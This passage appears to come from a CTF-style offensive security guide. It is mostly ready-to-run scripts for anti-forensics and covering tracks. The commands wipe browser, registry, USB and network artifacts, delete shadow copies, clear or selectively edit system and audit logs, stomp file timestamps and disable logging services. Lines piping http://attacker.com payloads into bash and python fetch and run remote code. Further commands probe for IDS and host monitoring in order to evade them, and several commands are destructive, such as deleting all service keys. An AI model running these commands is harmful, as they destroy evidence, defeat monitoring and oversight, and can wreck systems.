Remove-Item "$($firefoxProfile.FullName)\places.sqlite" -ErrorAction SilentlyContinue
Remove-Item "$($firefoxProfile.FullName)\cookies.sqlite" -ErrorAction SilentlyContinue

# Edge
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
```

**Registry Cleanup (IE/Edge):**

```cmd
REM Clear IE history registry entries
reg delete "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /va /f
reg delete "HKCU\Software\Microsoft\Internet Explorer\LowRegistry\DOMStorage" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f
```

### Linux Browser Cleanup

**Chrome/Chromium:**

```bash
# Kill Chrome processes
pkill -9 chrome
pkill -9 chromium

# Delete history
rm ~/.config/google-chrome/Default/History
rm ~/.config/google-chrome/Default/History-journal
rm ~/.config/chromium/Default/History

# Delete cookies
rm ~/.config/google-chrome/Default/Cookies
rm ~/.config/google-chrome/Default/Cookies-journal

# Delete cache
rm -rf ~/.cache/google-chrome/
rm -rf ~/.cache/chromium/

# Delete all Chrome data
rm -rf ~/.config/google-chrome/
rm -rf ~/.cache/google-chrome/
```

**Firefox:**

```bash
# Kill Firefox
pkill -9 firefox

# Find profile directory
PROFILE=$(find ~/.mozilla/firefox/ -name "*.default*" -type d | head -1)

# Delete history and bookmarks
rm "$PROFILE/places.sqlite"
rm "$PROFILE/places.sqlite-wal"
rm "$PROFILE/places.sqlite-shm"

# Delete cookies
rm "$PROFILE/cookies.sqlite"
rm "$PROFILE/cookies.sqlite-wal"

# Delete form history
rm "$PROFILE/formhistory.sqlite"

# Delete cache
rm -rf "$PROFILE/cache2/"
rm -rf ~/.cache/mozilla/firefox/

# Delete all Firefox data
rm -rf ~/.mozilla/firefox/
rm -rf ~/.cache/mozilla/
```

### SQLite Browser Database Manipulation

**Selective History Deletion (Chrome/Firefox):**

```bash
# Install sqlite3 if not present
apt-get install sqlite3  # Debian/Ubuntu
yum install sqlite       # RHEL/CentOS

# Chrome history (close browser first)
HISTORY="$HOME/.config/google-chrome/Default/History"

# View history
sqlite3 "$HISTORY" "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch') FROM urls;"

# Delete specific URL
sqlite3 "$HISTORY" "DELETE FROM urls WHERE url LIKE '%target-site.com%';"

# Delete by date
sqlite3 "$HISTORY" "DELETE FROM urls WHERE last_visit_time > strftime('%s', 'now') * 1000000 + 11644473600000000;"

# Delete all history
sqlite3 "$HISTORY" "DELETE FROM urls;"

# Vacuum database (clean up)
sqlite3 "$HISTORY" "VACUUM;"
```

**Firefox History Manipulation:**

```bash
# Firefox history (close browser first)
PROFILE=$(find ~/.mozilla/firefox/ -name "*.default*" -type d | head -1)
PLACES="$PROFILE/places.sqlite"

# View history
sqlite3 "$PLACES" "SELECT url, title, datetime(last_visit_date/1000000, 'unixepoch') FROM moz_places;"

# Delete specific domain
sqlite3 "$PLACES" "DELETE FROM moz_places WHERE url LIKE '%target-site.com%';"

# Delete by date range (last 24 hours)
sqlite3 "$PLACES" "DELETE FROM moz_places WHERE last_visit_date > strftime('%s', 'now', '-1 day') * 1000000;"

# Delete specific visit
sqlite3 "$PLACES" "DELETE FROM moz_historyvisits WHERE place_id IN (SELECT id FROM moz_places WHERE url LIKE '%sensitive-url%');"

# Delete all history
sqlite3 "$PLACES" "DELETE FROM moz_places;"
sqlite3 "$PLACES" "DELETE FROM moz_historyvisits;"

# Vacuum
sqlite3 "$PLACES" "VACUUM;"
```

**Cookie Deletion:**

```bash
# Chrome cookies
COOKIES="$HOME/.config/google-chrome/Default/Cookies"
sqlite3 "$COOKIES" "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%target.com%';"
sqlite3 "$COOKIES" "DELETE FROM cookies WHERE host_key LIKE '%target.com%';"
sqlite3 "$COOKIES" "VACUUM;"

# Firefox cookies
COOKIES="$PROFILE/cookies.sqlite"
sqlite3 "$COOKIES" "SELECT host, name, value FROM moz_cookies WHERE host LIKE '%target.com%';"
sqlite3 "$COOKIES" "DELETE FROM moz_cookies WHERE host LIKE '%target.com%';"
sqlite3 "$COOKIES" "VACUUM;"
```

### Download History Cleanup

**Windows Downloads:**

```powershell
# Clear recent files list
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse

# Clear jump lists
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force

# Chrome downloads
sqlite3 "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" "DELETE FROM downloads;"

# Edge downloads  
sqlite3 "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" "DELETE FROM downloads;"
```

**Linux Downloads:**

```bash
# Chrome downloads
HISTORY="$HOME/.config/google-chrome/Default/History"
sqlite3 "$HISTORY" "DELETE FROM downloads;"
sqlite3 "$HISTORY" "DELETE FROM downloads_url_chains;"

# Firefox downloads
PLACES="$PROFILE/places.sqlite"
sqlite3 "$PLACES" "DELETE FROM moz_annos WHERE anno_attribute_id = (SELECT id FROM moz_anno_attributes WHERE name = 'downloads/destinationFileURI');"

# Clear recent files (GNOME)
rm ~/.local/share/recently-used.xbel

# Clear Nautilus recent files
rm ~/.local/share/gnome-shell/nautilus-history
```

### Cache and Temporary Files

**Windows Cache Cleanup:**

```cmd
REM Browser caches already covered above

REM Clear Windows temp files
del /q /f /s %TEMP%\*
del /q /f /s C:\Windows\Temp\*

REM Clear prefetch
del /q /f /s C:\Windows\Prefetch\*

REM Clear DNS cache
ipconfig /flushdns

REM Clear thumbnail cache
del /q /f /s %LOCALAPPDATA%\Microsoft\Windows\Explorer\thumbcache_*.db
```

**Linux Cache Cleanup:**

```bash
# Browser caches already covered

# Clear thumbnail cache
rm -rf ~/.cache/thumbnails/*
rm -rf ~/.thumbnails/*

# Clear system temp
rm -rf /tmp/*
rm -rf /var/tmp/*

# Clear user cache
rm -rf ~/.cache/*

# Clear DNS cache (if systemd-resolved)
systemd-resolve --flush-caches
```

### Session Storage and Local Storage

**Chrome DevTools Cleanup (Manual):**

```
F12 → Application → Storage
- Clear Local Storage
- Clear Session Storage
- Clear IndexedDB
- Clear Web SQL
- Clear Service Workers
```

**Programmatic Cleanup (JavaScript in console):**

```javascript
// Clear localStorage
localStorage.clear();

// Clear sessionStorage
sessionStorage.clear();

// Clear all cookies
document.cookie.split(";").forEach(function(c) { 
    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
});

// Clear IndexedDB
indexedDB.databases().then(dbs => {
    dbs.forEach(db => indexedDB.deleteDatabase(db.name));
});
```

**Chrome Local Storage Files:**

```bash
# Linux
rm ~/.config/google-chrome/Default/Local\ Storage/leveldb/*

# Windows
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb\*"
```

### Autofill and Form Data

**Chrome Autofill Cleanup:**

```bash
# Linux
WEBDATA="$HOME/.config/google-chrome/Default/Web Data"
sqlite3 "$WEBDATA" "DELETE FROM autofill;"
sqlite3 "$WEBDATA" "DELETE FROM autofill_profiles;"
sqlite3 "$WEBDATA" "DELETE FROM credit_cards;"
sqlite3 "$WEBDATA" "VACUUM;"

# Windows (PowerShell)
$webdata = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
# Requires Chrome to be closed
# Use sqlite3.exe for Windows or DB Browser for SQLite
```

**Firefox Form History:**

```bash
FORMHISTORY="$PROFILE/formhistory.sqlite"
sqlite3 "$FORMHISTORY" "DELETE FROM moz_formhistory;"
sqlite3 "$FORMHISTORY" "VACUUM;"
```

### Password Manager Data

**[Unverified] Browser password stores are typically encrypted. Direct manipulation requires decryption keys.**

**Chrome Login Data:**

```bash
# Linux location
~/.config/google-chrome/Default/Login Data

# View (requires decryption)
sqlite3 "$HOME/.config/google-chrome/Default/Login Data" "SELECT origin_url, username_value FROM logins;"

# Delete all stored passwords (does not require decryption)
sqlite3 "$HOME/.config/google-chrome/Default/Login Data" "DELETE FROM logins;"
sqlite3 "$HOME/.config/google-chrome/Default/Login Data" "VACUUM;"

# Windows
# $env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data
```

**Firefox Passwords:**

```bash
# Stored in key4.db and logins.json
rm "$PROFILE/key4.db"
rm "$PROFILE/logins.json"
```

### Extension Data Cleanup

**Chrome Extensions:**

```bash
# Linux
rm -rf ~/.config/google-chrome/Default/Extensions/*
rm -rf ~/.config/google-chrome/Default/Extension\ Rules/*
rm -rf ~/.config/google-chrome/Default/Extension\ State/*

# Windows
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions\*" -Recurse -Force
```

**Firefox Add-ons:**

```bash
rm -rf "$PROFILE/extensions/"
rm "$PROFILE/extensions.json"
rm "$PROFILE/addonStartup.json.lz4"
```

### DNS Prefetch and HSTS Data

**Chrome HSTS Cleanup:**

```bash
# Transport Security file (HSTS/HPKP)
rm ~/.config/google-chrome/Default/TransportSecurity

# Windows
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\TransportSecurity"
```

**Firefox Site Security Service:**

```bash
rm "$PROFILE/SiteSecurityServiceState.txt"
```

### Automated Browser Cleanup Scripts

**Linux Universal Browser Cleaner:**

```bash
#!/bin/bash
# browser_cleanup.sh - Clean all browser artifacts

echo "[*] Killing browser processes..."
pkill -9 chrome chromium firefox

echo "[*] Cleaning Chrome..."
rm -rf ~/.config/google-chrome/Default/History*
rm -rf ~/.config/google-chrome/Default/Cookies*
rm -rf ~/.cache/google-chrome/
rm -rf ~/.config/chromium/Default/History*
rm -rf ~/.cache/chromium/

echo "[*] Cleaning Firefox..."
FFPROFILE=$(find ~/.mozilla/firefox/ -name "*.default*" -type d | head -1)
if [ -n "$FFPROFILE" ]; then
    rm -f "$FFPROFILE/places.sqlite"*
    rm -f "$FFPROFILE/cookies.sqlite"*
    rm -f "$FFPROFILE/formhistory.sqlite"*
    rm -rf "$FFPROFILE/cache2/"
fi
rm -rf ~/.cache/mozilla/

echo "[*] Cleaning cache and temp..."
rm -rf ~/.cache/thumbnails/*
rm -rf /tmp/*

echo "[*] Cleanup complete"
```

**Windows PowerShell Browser Cleaner:**

```powershell
# browser_cleanup.ps1
Write-Host "[*] Stopping browsers..." -ForegroundColor Yellow
Stop-Process -Name chrome,msedge,firefox -Force -ErrorAction SilentlyContinue

Write-Host "[*] Cleaning Chrome..." -ForegroundColor Yellow
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "[*] Cleaning Edge..." -ForegroundColor Yellow
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "[*] Cleaning Firefox..." -ForegroundColor Yellow
$ffProfile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($ffProfile) {
    Remove-Item "$($ffProfile.FullName)\places.sqlite*" -Force -ErrorAction SilentlyContinue
    Remove-Item "$($ffProfile.FullName)\cookies.sqlite*" -Force -ErrorAction SilentlyContinue
    Remove-Item "$($ffProfile.FullName)\cache2\" -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "[*] Cleaning temp files..." -ForegroundColor Yellow
Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue

Write-Host "[+] Cleanup complete" -ForegroundColor Green
```

### Windows Artifacts Beyond Browsers

**Recent Documents:**

```cmd
REM Clear recent files
del /q /f /s %APPDATA%\Microsoft\Windows\Recent\*

REM Clear jump lists
del /q /f /s %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*
del /q /f /s %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*
```

**Windows Search Index:**

```cmd
REM Stop search service
net stop wsearch

REM Delete search database
del /q /f C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb

REM Restart service
net start wsearch
```

**Prefetch Files:**

```cmd
REM Contains evidence of program execution
del /q /f C:\Windows\Prefetch\*.pf
```

**ShimCache (Application Compatibility Cache):**

```powershell
# Clear shimcache registry entries (requires admin)
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f
```

**UserAssist Registry:**

```cmd
REM Tracks program execution via Explorer
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f
```

**MUI Cache:**

```cmd
REM Application execution artifact
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f
```

### Network Artifacts

**Windows Network History:**

```powershell
# Clear network profiles
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles" | Remove-Item -Recurse -Force

# Clear wireless network history
netsh wlan delete profile name=* i=*

# Clear network interface history
Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\*" -Recurse -Force -ErrorAction SilentlyContinue
```

**Linux Network History:**

```bash
# Clear NetworkManager connections
rm /etc/NetworkManager/system-connections/*

# Clear wireless history
rm /var/lib/NetworkManager/*

# Clear DHCP leases
rm /var/lib/dhcp/*
rm /var/lib/dhclient/*
```

### USB Device History

**Windows USB Artifacts:**

```cmd
REM USBSTOR registry entries
reg delete "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR" /f

REM USB device history
reg delete "HKLM\SYSTEM\CurrentControlSet\Enum\USB" /f

REM Mounted devices
reg delete "HKLM\SYSTEM\MountedDevices" /f
```

**Linux USB History:**

```bash
# Clear udev rules
rm /etc/udev/rules.d/70-persistent-*.rules

# Clear USB device logs
> /var/log/syslog
> /var/log/messages

# Dmesg (requires root)
dmesg -c
```

### Thumbnail Cache

**Windows Thumbnails:**

```cmd
REM Thumbcache files
del /q /f %LOCALAPPDATA%\Microsoft\Windows\Explorer\thumbcache_*.db

REM Icon cache
del /q /f %LOCALAPPDATA%\IconCache.db

REM Explorer restart required
taskkill /f /im explorer.exe
start explorer.exe
```

**Linux Thumbnails:**

```bash
rm -rf ~/.cache/thumbnails/*
rm -rf ~/.thumbnails/*
```

### Registry Run Keys (Windows Persistence Cleanup)

**Remove Persistence Artifacts:**

```cmd
REM Current User Run keys
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /f

REM Local Machine Run keys (requires admin)
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /f

REM Services
reg delete "HKLM\System\CurrentControlSet\Services" /f
```

### Scheduled Tasks Cleanup

**Windows:**

```cmd
REM List scheduled tasks
schtasks /query /fo LIST /v

REM Delete specific task
schtasks /delete /tn "TaskName" /f

REM Delete all tasks (dangerous)
FOR /F "tokens=1" %i IN ('schtasks /query /fo LIST ^| findstr "TaskName"') DO schtasks /delete /tn %i /f
```

**Linux:**

```bash
# Remove cron jobs
crontab -r  # Remove all cron jobs for current user

# Or edit
crontab -e

# System-wide cron
rm /etc/cron.d/malicious_job
rm /etc/cron.daily/malicious_script
rm /etc/cron.hourly/malicious_script

# At jobs
atq  # List
atrm <job_number>  # Remove
```

### Windows Event Log Correlation

**Anti-Forensics Considerations:**

```
[Inference] Even after clearing logs, forensic investigators may recover:
- Event log backups
- Volume Shadow Copies
- SIEM/centralized logging
- Memory dumps
- Network traffic logs
- Cloud backup services
```

**Volume Shadow Copy Deletion:**

```cmd
REM List shadow copies
vssadmin list shadows

REM Delete all shadow copies
vssadmin delete shadows /all /quiet

REM Or using wmic
wmic shadowcopy delete

REM Disable shadow copies
vssadmin resize shadowstorage /for=C: /on=C: /maxsize=UNBOUNDED
vssadmin delete shadows /for=C: /all /quiet
```

**Windows Recycle Bin:**

```cmd
REM Clear recycle bin
rd /s /q C:\$Recycle.Bin

REM PowerShell
Clear-RecycleBin -Force

REM All drives
powershell -c "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"
```

### Linux Log Rotation Artifacts

**Compressed Log Cleanup:**

```bash
# Remove rotated/compressed logs
rm /var/log/*.gz
rm /var/log/*.1
rm /var/log/*.2
rm /var/log/*.[0-9]

# Apache/Nginx rotated logs
rm /var/log/apache2/*.gz
rm /var/log/nginx/*.gz
rm /var/log/apache2/access.log.*
rm /var/log/nginx/access.log.*
```

### Forensic Tool Artifacts

**Anti-Forensic Techniques:**

```bash
# Overwrite free space (makes recovery harder)
# Linux
dd if=/dev/urandom of=/largefile bs=1M
rm /largefile

# Or use sfill (from secure-delete package)
apt-get install secure-delete
sfill -v /home

# Windows
# Use cipher command
cipher /w:C:\
```

**Secure File Deletion:**

```bash
# Linux - shred
shred -vfz -n 10 sensitive_file.txt

# srm (secure remove)
srm -v sensitive_file.txt

# wipe
wipe -rf sensitive_directory/

# Windows - sdelete (Sysinternals)
sdelete -p 7 sensitive_file.txt
sdelete -c C:\  # Clean free space
```

### Memory Dumps and Swap

**Clear Swap/Pagefile:**

```bash
# Linux - disable and clear swap
swapoff -a
swapon -a

# Or wipe swap partition
swapoff /dev/sda2
dd if=/dev/zero of=/dev/sda2 bs=1M
mkswap /dev/sda2
swapon /dev/sda2

# Windows - clear pagefile on shutdown
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f
```

**Hibernation File:**

```cmd
REM Windows - disable hibernation (clears hiberfil.sys)
powercfg -h off
```

### Database Connection History

**MySQL History:**

```bash
# Clear MySQL command history
> ~/.mysql_history
cat /dev/null > ~/.mysql_history
rm ~/.mysql_history

# For all users
for home in /home/*; do
    [ -f "$home/.mysql_history" ] && > "$home/.mysql_history"
done
```

**PostgreSQL History:**

```bash
# Clear psql history
> ~/.psql_history
rm ~/.psql_history
```

**Redis CLI History:**

```bash
> ~/.rediscli_history
rm ~/.rediscli_history
```

### Cloud Storage Sync Artifacts

**Dropbox:**

```bash
# Linux
rm -rf ~/.dropbox/
rm -rf ~/Dropbox/.dropbox.cache/

# Windows
Remove-Item "$env:LOCALAPPDATA\Dropbox" -Recurse -Force
Remove-Item "$env:APPDATA\Dropbox" -Recurse -Force
```

**OneDrive:**

```powershell
# Windows
Remove-Item "$env:LOCALAPPDATA\Microsoft\OneDrive" -Recurse -Force
Remove-Item "$env:USERPROFILE\OneDrive" -Recurse -Force
```

### Comprehensive Cleanup Script (Linux)

```bash
#!/bin/bash
# comprehensive_cleanup.sh - Complete artifact removal

echo "[*] Starting comprehensive cleanup..."

# System logs
echo "[*] Clearing system logs..."
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/syslog
truncate -s 0 /var/log/messages
truncate -s 0 /var/log/secure
rm /var/log/*.gz /var/log/*.1 2>/dev/null

# Web server logs
echo "[*] Clearing web server logs..."
truncate -s 0 /var/log/apache2/access.log 2>/dev/null
truncate -s 0 /var/log/apache2/error.log 2>/dev/null
truncate -s 0 /var/log/nginx/access.log 2>/dev/null
truncate -s 0 /var/log/nginx/error.log 2>/dev/null

# Login records
echo "[*] Clearing login records..."
echo -n > /var/log/wtmp
echo -n > /var/log/btmp
echo -n > /var/log/lastlog

# Command histories
echo "[*] Clearing command histories..."
history -c
cat /dev/null > ~/.bash_history
for home in /home/*; do
    [ -f "$home/.bash_history" ] && cat /dev/null > "$home/.bash_history"
    [ -f "$home/.zsh_history" ] && cat /dev/null > "$home/.zsh_history"
    [ -f "$home/.mysql_history" ] && cat /dev/null > "$home/.mysql_history"
done

# Browser data
echo "[*] Clearing browser data..."
pkill -9 chrome firefox 2>/dev/null
rm -rf ~/.config/google-chrome/Default/History* 2>/dev/null
rm -rf ~/.cache/google-chrome/ 2>/dev/null
FFPROFILE=$(find ~/.mozilla/firefox/ -name "*.default*" -type d 2>/dev/null | head -1)
[ -n "$FFPROFILE" ] && rm -f "$FFPROFILE/places.sqlite"* "$FFPROFILE/cookies.sqlite"*

# Temporary files
echo "[*] Clearing temporary files..."
rm -rf /tmp/* /var/tmp/* 2>/dev/null
rm -rf ~/.cache/* 2>/dev/null

# Audit logs
echo "[*] Clearing audit logs..."
systemctl stop auditd 2>/dev/null
truncate -s 0 /var/log/audit/audit.log 2>/dev/null
systemctl start auditd 2>/dev/null

echo "[+] Cleanup complete"
```

**Critical Related Topics:**

- **Memory Forensics**: RAM acquisition, Volatility framework analysis, detecting memory-resident malware, anti-memory forensics
- **Disk Forensics**: File carving, deleted file recovery, filesystem timeline analysis, anti-disk forensics techniques
- **Network Forensics**: Packet capture analysis, network flow logging, DNS query logging, proxy logs
- **SIEM Bypass**: Evading centralized logging, log correlation disruption, timestamp manipulation across systems
- **Windows Event Log Analysis**: Understanding security event IDs (4624, 4625, 4688, 4720), PowerShell logging (4104, 4103)
- **Live Response**: Detecting active forensic investigation, anti-live response techniques
- **Timeline Analysis**: Understanding file system timestamps (MAC times), timeline manipulation, time stomping
- **Cloud Logging**: AWS CloudTrail, Azure Activity Logs, GCP Cloud Audit Logs - cloud-specific forensics and anti-forensics

---

## Evidence Cleanup

### Understanding Log Structures

**Linux System Logs**

- `/var/log/auth.log` or `/var/log/secure` - Authentication attempts, sudo usage, SSH sessions
- `/var/log/syslog` or `/var/log/messages` - General system activity
- `/var/log/apache2/access.log`, `/var/log/nginx/access.log` - Web server access
- `/var/log/apache2/error.log` - Web application errors
- `/var/log/wtmp`, `/var/log/btmp` - Login records (binary format)
- `/var/log/lastlog` - Last login times (binary)
- `~/.bash_history`, `~/.zsh_history` - Command history per user

**Windows System Logs**

- Event Viewer logs: `C:\Windows\System32\winevt\Logs\`
    - Security.evtx - Authentication, privilege changes
    - System.evtx - System-level events
    - Application.evtx - Application events
- IIS logs: `C:\inetpub\logs\LogFiles\`
- PowerShell history: `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

### Manual Log Manipulation Techniques

**Selective Log Editing (Linux)**

```bash
# Remove specific lines from text logs
sed -i '/192.168.1.100/d' /var/log/apache2/access.log

# Remove entries containing specific username
sed -i '/compromised_user/d' /var/log/auth.log

# Remove lines within time range
awk '!/2025-10-17 14:3[0-5]/' /var/log/syslog > /tmp/clean && mv /tmp/clean /var/log/syslog

# Truncate log file while maintaining permissions
: > /var/log/auth.log  # Clears content, preserves file attributes
```

**Binary Log Manipulation**

```bash
# wtmp/btmp manipulation (use utmpdump to edit)
utmpdump /var/log/wtmp > /tmp/wtmp.txt
# Edit /tmp/wtmp.txt to remove entries
grep -v '192.168.1.100' /tmp/wtmp.txt > /tmp/wtmp_clean.txt
utmpdump -r /tmp/wtmp_clean.txt > /var/log/wtmp

# lastlog manipulation requires binary editing or C programs
# [Inference] Most CTF scenarios don't verify lastlog consistency
```

**Timestamp Manipulation**

```bash
# Modify file timestamps to match surrounding files
touch -r /var/log/syslog.1 /var/log/auth.log  # Copy timestamp from reference file
touch -t 202510151430.00 /var/log/apache2/access.log  # Set specific timestamp

# Preserve original timestamps during editing
TIMESTAMP=$(stat -c %y /var/log/auth.log)
# ... perform edits ...
touch -d "$TIMESTAMP" /var/log/auth.log
```

**Windows Log Clearing**

```powershell
# Clear specific event logs (requires admin)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Selective deletion using PowerShell
Get-WinEvent -LogName Security | Where-Object {$_.Message -notlike "*specific_pattern*"} | 
  ForEach-Object { wevtutil delete-log Security /q:$_.RecordID }

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

### Automated Cleanup Tools

**ClearLogs (Custom Script Example)**

```bash
#!/bin/bash
# Basic log cleanup automation

TARGET_IP="$1"
LOGS=(
    "/var/log/auth.log"
    "/var/log/syslog"
    "/var/log/apache2/access.log"
    "/var/log/nginx/access.log"
)

for log in "${LOGS[@]}"; do
    if [ -f "$log" ]; then
        sed -i "/$TARGET_IP/d" "$log"
        echo "[+] Cleaned $log"
    fi
done

# Clean command history
history -c
rm -f ~/.bash_history ~/.zsh_history
ln -s /dev/null ~/.bash_history
```

**Log Rotation Exploitation**

```bash
# Force log rotation to move evidence into compressed archives
logrotate -f /etc/logrotate.conf

# Modify rotated logs (harder to detect in compressed archives)
gunzip /var/log/auth.log.1.gz
sed -i '/malicious_activity/d' /var/log/auth.log.1
gzip /var/log/auth.log.1
```

### Application-Specific Cleanup

**Web Server Logs**

```bash
# Apache: Real-time log clearing while maintaining service
tail -n 1000 /var/log/apache2/access.log | grep -v 'attack_pattern' > /tmp/clean
cat /tmp/clean > /var/log/apache2/access.log

# Nginx: Similar approach
tail -n 1000 /var/log/nginx/access.log | grep -v 'malicious_request' > /tmp/clean
cat /tmp/clean > /var/log/nginx/access.log
```

**Database Audit Logs**

```sql
-- MySQL: Disable logging temporarily
SET GLOBAL general_log = 'OFF';
-- Perform actions
SET GLOBAL general_log = 'ON';

-- Clear query log
TRUNCATE TABLE mysql.general_log;

-- PostgreSQL: Modify postgresql.conf
-- log_statement = 'none'  # Disable query logging
```

**SSH Log Cleanup**

```bash
# Remove SSH login records
sed -i '/sshd.*Accepted/d' /var/log/auth.log

# Clean known_hosts
> ~/.ssh/known_hosts

# Remove SSH agent forwarding traces
unset SSH_AUTH_SOCK
unset SSH_AGENT_PID
```

### Anti-Forensics Techniques

**Log Disabling**

```bash
# Stop logging services (detectable but effective)
systemctl stop rsyslog
systemctl stop auditd

# Redirect logs to /dev/null
ln -sf /dev/null /var/log/auth.log
ln -sf /dev/null /var/log/syslog

# Kernel-level logging suppression [Inference]
# Requires kernel module manipulation, rarely needed in CTF
```

**Memory-Only Operations**

```bash
# Execute commands without touching disk
unset HISTFILE  # Prevents history saving
export HISTSIZE=0

# Run scripts from memory
wget -O - http://attacker.com/script.sh | bash
curl http://attacker.com/payload | python3

# Use tmpfs for temporary files
mount -t tmpfs -o size=100m tmpfs /mnt/ramdisk
# Work in /mnt/ramdisk (cleared on reboot)
```

**Logrotate Configuration Abuse**

```bash
# Modify rotation to occur more frequently
# /etc/logrotate.d/custom
/var/log/auth.log {
    rotate 0      # Keep no old logs
    size 1k       # Rotate at tiny size
    missingok
    notifempty
}

# Force immediate rotation
logrotate -f /etc/logrotate.d/custom
```

### Persistence Artifact Cleanup

**Cron Job Removal**

```bash
# List all cron jobs
crontab -l
crontab -r  # Remove user crontab

# System-wide cron
rm -f /etc/cron.d/malicious_job
rm -f /etc/cron.daily/backdoor
```

**Systemd Service Cleanup**

```bash
# Remove malicious service
systemctl stop malicious.service
systemctl disable malicious.service
rm /etc/systemd/system/malicious.service
systemctl daemon-reload
```

**Web Shell Removal**

```bash
# Find recently modified PHP files
find /var/www/html -name "*.php" -mtime -7

# Search for common web shell patterns
grep -r "eval(" /var/www/html/*.php
grep -r "base64_decode" /var/www/html/*.php
grep -r "system(" /var/www/html/*.php

# Remove identified shells
rm /var/www/html/uploads/shell.php
```

---

## Identifying Detection Mechanisms

### Network-Based Detection

**Intrusion Detection Systems (IDS)**

**Snort Detection**

```bash
# Check if Snort is running
ps aux | grep snort
netstat -tulnp | grep snort  # Default port 3306 for MySQL logging

# Identify Snort rules location
# Common paths:
# /etc/snort/rules/
# /usr/local/etc/snort/rules/

# Examine active rules
cat /etc/snort/rules/*.rules | grep -i "sql injection\|xss\|command injection"
```

**Suricata Detection**

```bash
# Check Suricata status
systemctl status suricata
ps aux | grep suricata

# Configuration file
cat /etc/suricata/suricata.yaml

# Rule location
ls /var/lib/suricata/rules/
```

**Detection Indicators**

- **Connection resets**: Sudden TCP RST packets may indicate IDS blocking
- **Delayed responses**: Inline IDS/IPS adds processing latency
- **Repeated blocks**: Same payload blocked consistently = signature match

**Passive Traffic Analysis**

```bash
# Check for promiscuous mode interfaces (packet sniffing)
ip link show | grep PROMISC
ifconfig | grep PROMISC

# Identify tcpdump/Wireshark processes
ps aux | grep -E 'tcpdump|wireshark|tshark'

# [Inference] If monitoring interface differs from service interface,
# suggests passive monitoring rather than inline blocking
```

### Host-Based Detection

**Intrusion Detection Systems (HIDS)**

**OSSEC Detection**

```bash
# Check OSSEC installation
ps aux | grep ossec
ls /var/ossec/

# Configuration
cat /var/ossec/etc/ossec.conf

# Active response scripts
ls /var/ossec/active-response/bin/

# Alert rules
cat /var/ossec/rules/*.xml | grep -i "level=\"1[0-5]\""
```

**Wazuh Detection**

```bash
# Check Wazuh agent
systemctl status wazuh-agent
ps aux | grep wazuh

# Configuration
cat /var/ossec/etc/ossec.conf
```

**Tripwire/AIDE (File Integrity Monitoring)**

```bash
# Check for Tripwire
which tripwire
ps aux | grep tripwire

# Check for AIDE
which aide
ls /var/lib/aide/

# [Inference] File integrity monitors typically run scheduled checks
# Check cron jobs for aide/tripwire
cat /etc/cron.d/* | grep -E 'aide|tripwire'
```

**Indicators**

- Database files: `/var/lib/aide/aide.db`, `/var/lib/tripwire/*.twd`
